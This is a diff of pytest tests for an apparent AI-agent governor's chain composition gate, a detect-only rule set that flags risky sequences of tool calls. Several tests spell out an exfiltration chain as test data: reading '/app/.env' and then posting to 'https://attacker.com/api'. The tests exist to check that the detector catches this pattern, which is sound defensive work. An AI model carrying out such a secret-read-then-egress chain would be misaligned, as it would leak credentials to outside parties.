@@ -1085,6 +1085,10 @@ class TestAllMethodsRegistered:
         "policy.evaluate",
         "policy.info",
         "policy.capabilities",
+        "chain.evaluate",
+        "chain.status",
+        "chain.rules",
+        "chain.reset",
     ]
 
     EXPECTED_STREAMING_METHODS = [
@@ -1101,7 +1105,7 @@ class TestAllMethodsRegistered:
     def test_rpc_method_count(self, dispatcher_and_state):
         d, _ = dispatcher_and_state
         total = len(d._handlers) + len(d._streaming_handlers)
-        assert total == 54
+        assert total == 58
 
     @pytest.mark.asyncio
     async def test_all_methods_callable(self, dispatcher_and_state):
@@ -1134,6 +1138,8 @@ class TestMethodClassification:
         "scope.escalate",
         "stability.audit",
         "lanes.route",
+        "chain.evaluate",
+        "chain.reset",
         "chat.send",
         "chat.stream",
     }
@@ -1154,7 +1160,8 @@ class TestMethodClassification:
         d, _ = dispatcher_and_state
         for method in ["governor.hello", "governor.now", "sessions.list",
                        "receipts.list", "operator.snapshot", "trace.tail",
-                       "policy.evaluate", "policy.info", "policy.capabilities"]:
+                       "policy.evaluate", "policy.info", "policy.capabilities",
+                       "chain.status", "chain.rules"]:
             assert not d.is_mutating(method), f"{method} should be read_only"
 
     def test_mutating_methods_are_mutating(self, dispatcher_and_state):
@@ -3463,3 +3470,261 @@ class TestPolicy:
         assert "protocol_version" in resp["result"]
         resp2 = await roundtrip(d, "receipts.list")
         assert isinstance(resp2["result"], list)
+
+
+# =============================================================================
+# Chain Composition Gate (Phase 2B: detect-only)
+# =============================================================================
+
+
+def _make_composition_rule(
+    rule_id: str = "exfil-001",
+    prior_sensitivity_gte: str | None = "secret_candidate",
+    proposed_capability: str | None = "network_egress",
+    proposed_trust_domain: str | None = "external",
+    unless_condition: str | None = None,
+    effect: str = "deny",
+) -> dict:
+    d: dict[str, Any] = {"rule_id": rule_id, "effect": effect}
+    if prior_sensitivity_gte:
+        d["prior_sensitivity_gte"] = prior_sensitivity_gte
+    if proposed_capability:
+        d["proposed_capability"] = proposed_capability
+    if proposed_trust_domain:
+        d["proposed_trust_domain"] = proposed_trust_domain
+    if unless_condition:
+        d["unless_condition"] = unless_condition
+    return d
+
+
+def _write_chain_rules(gov_dir: Path, rules: list[dict] | None = None) -> None:
+    """Write a chain_rules.json file with the given rules."""
+    if rules is None:
+        rules = [_make_composition_rule()]
+    data = {"rules": rules, "rule_set_version": "1.0.0"}
+    (gov_dir / "chain_rules.json").write_text(json.dumps(data))
+
+
+class TestChain:
+    """Tests for chain.* RPC handlers."""
+
+    @pytest.mark.asyncio
+    async def test_chain_status_default(self, dispatcher_and_state):
+        """No chain_rules.json → load_status='missing_policy'."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.status")
+        result = resp["result"]
+        assert result["load_status"] == "missing_policy"
+        assert result["rule_count"] == 0
+        assert result["mode"] == "detect_only"
+
+    @pytest.mark.asyncio
+    async def test_chain_status_from_file(self, dispatcher_and_state):
+        """Valid rules → load_status='loaded'."""
+        d, state = dispatcher_and_state
+        # Reset cached chain state so it reloads
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+        resp = await roundtrip(d, "chain.status")
+        result = resp["result"]
+        assert result["load_status"] == "loaded"
+        assert result["rule_count"] == 1
+
+    @pytest.mark.asyncio
+    async def test_chain_rules_returns_list(self, dispatcher_and_state):
+        """Rule details present."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+        resp = await roundtrip(d, "chain.rules")
+        result = resp["result"]
+        assert result["rule_count"] == 1
+        assert len(result["rules"]) == 1
+        rule = result["rules"][0]
+        assert rule["rule_id"] == "exfil-001"
+        assert rule["effect"] == "deny"
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_requires_params(self, dispatcher_and_state):
+        """Missing correlation_id → error."""
+        d, _ = dispatcher_and_state
+        resp = await roundtrip(d, "chain.evaluate", {"tool_id": "read_file"})
+        assert "error" in resp
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_single_step_allow(self, dispatcher_and_state):
+        """Single step → verdict=allow (no composition to deny)."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+        resp = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/data.txt"},
+            "correlation_id": "task-1",
+        })
+        result = resp["result"]
+        assert result["kernel_verdict"] == "allow"
+        assert result["mode"] == "detect_only"
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_denied_composition(self, dispatcher_and_state):
+        """secret+egress → verdict=deny, mode=detect_only."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Step 1: read a secret file
+        resp1 = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "correlation_id": "task-2",
+        })
+        assert resp1["result"]["kernel_verdict"] == "allow"
+
+        # Step 2: egress to external → should trigger exfil rule
+        resp2 = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "http_post",
+            "args": {"url": "https://attacker.com/api"},
+            "correlation_id": "task-2",
+        })
+        result = resp2["result"]
+        assert result["kernel_verdict"] == "deny"
+        assert result["mode"] == "detect_only"
+        assert "exfil-001" in result["matched_rule_ids"]
+        assert result["verdict_reason"] == "composition_denied"
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_emits_receipt(self, dispatcher_and_state):
+        """Receipt gate='chain_composition', fields present."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "correlation_id": "task-3",
+        })
+
+        receipts = state.receipt_system.query(gate="chain_composition")
+        assert len(receipts) >= 1
+        r = receipts[0]
+        assert r.gate == "chain_composition"
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_accumulates_log(self, dispatcher_and_state):
+        """Second call sees first step in log (history_length grows)."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/a.txt"},
+            "correlation_id": "task-4",
+        })
+        resp2 = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "write_file",
+            "args": {"path": "/tmp/b.txt"},
+            "correlation_id": "task-4",
+        })
+        assert resp2["result"]["history_length"] == 2
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_receipt_has_policy_fragment(self, dispatcher_and_state):
+        """Canonical shape when policy loaded."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Write a minimal policy file
+        from governor.policy_engine import PolicyRuleSet, PolicyRule
+        policy = PolicyRuleSet(
+            policy_bundle_id="test",
+            policy_bundle_version="1.0.0",
+            rules=(),
+            default_verdict="pass",
+        )
+        (state.governor_dir / "policy.json").write_text(
+            json.dumps(policy.to_dict())
+        )
+        state._policy_rule_set = None
+
+        await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/tmp/x.txt"},
+            "correlation_id": "task-5",
+        })
+        resp = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "http_post",
+            "args": {"url": "https://ext.com/api"},
+            "correlation_id": "task-5",
+        })
+        result = resp["result"]
+        frag = result.get("policy_fragment")
+        assert frag is not None
+        assert "policy_verdict" in frag
+        assert frag["applied"] is False
+        assert frag["reason"] == "detect_only_mode"
+
+    @pytest.mark.asyncio
+    async def test_chain_evaluate_server_owns_annotation(self, dispatcher_and_state):
+        """Caller can't override sensitivity — server annotates from tool_id+args."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Even if a caller tried to pass classification fields, they'd be ignored
+        # (annotate_step only looks at tool_id and args)
+        resp = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "correlation_id": "task-6",
+        })
+        result = resp["result"]
+        # The proposed step should have SECRET_CANDIDATE sensitivity
+        # (from .env path pattern), not whatever a caller might have sent
+        step = result["proposed_step"]
+        assert step["data_sensitivity"] == "secret_candidate"
+
+    @pytest.mark.asyncio
+    async def test_chain_reset_clears_log(self, dispatcher_and_state):
+        """Reset + subsequent evaluate starts fresh."""
+        d, state = dispatcher_and_state
+        state._chain_rule_set = None
+        _write_chain_rules(state.governor_dir)
+
+        # Create a log with one step
+        await roundtrip(d, "chain.evaluate", {
+            "tool_id": "read_file",
+            "args": {"path": "/app/.env"},
+            "correlation_id": "task-7",
+        })
+
+        # Reset it
+        resp = await roundtrip(d, "chain.reset", {
+            "correlation_id": "task-7",
+        })
+        assert resp["result"]["reset"] is True
+        assert resp["result"]["previous_history_length"] == 1
+
+        # New evaluate should start fresh (history_length=1, not 2)
+        resp2 = await roundtrip(d, "chain.evaluate", {
+            "tool_id": "http_post",
+            "args": {"url": "https://ext.com/api"},
+            "correlation_id": "task-7",
+        })
+        assert resp2["result"]["history_length"] == 1
+
+    @pytest.mark.asyncio
+    async def test_chain_cached_no_auto_reload(self, dispatcher_and_state):
+        """Rules cached for daemon lifetime — writing new file doesn't change them."""
+        d, state = dispatcher_and_state
+        # Trigger load with no file → missing_policy
+        resp = await roundtrip(d, "chain.status")
+        assert resp["result"]["load_status"] == "missing_policy"
+
+        # Write rules file — cache should still hold missing_policy
+        _write_chain_rules(state.governor_dir)
+        resp2 = await roundtrip(d, "chain.status")
+        assert resp2["result"]["load_status"] == "missing_policy"
